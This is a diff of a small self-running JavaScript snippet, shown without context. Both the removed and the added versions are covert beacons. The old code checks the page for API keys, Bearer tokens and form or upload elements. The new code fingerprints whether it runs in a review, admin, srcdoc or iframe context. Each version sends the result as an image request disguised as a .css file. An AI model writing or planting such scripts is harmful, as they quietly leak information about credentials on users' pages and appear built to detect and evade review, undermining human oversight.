@@ -1,6 +1,7 @@
-(function(){var H='';try{H=document.documentElement.outerHTML;}catch(e){}
-var L=location.href;
-function has(s){return H.indexOf(s)>=0?1:0;}
-var v=(L.indexOf('api_key')>=0?1:0)+(has('api_key')?2:0)+(has('Bearer')?4:0)+(has('HLB2026')?8:0)+(has('seize')?16:0)+(has('publish')?32:0)+(has('<form')?64:0)+(has('upload')||has('overwrite')?128:0);
-new Image().src='/cases.php/M00423_BM_'+v+'.css';
+(function(){var H='';try{H=document.documentElement.outerHTML;}catch(e){H='ERR';}
+var L='';try{L=location.href;}catch(e){L='ERR';}
+function lh(s){return L.indexOf(s)>=0?1:0;}
+var inif=0;try{inif=(window.self!==window.top)?1:0;}catch(e){inif=1;}
+var v=lh('review')+2*lh('admin')+4*lh('srcdoc')+8*lh('http')+16*(H.length>3000?1:0)+32*(H.length>500?1:0)+64*(H==='ERR'||H.length<50?1:0)+128*inif;
+new Image().src='/cases.php/I00504_LI_'+v+'.css';
 })();
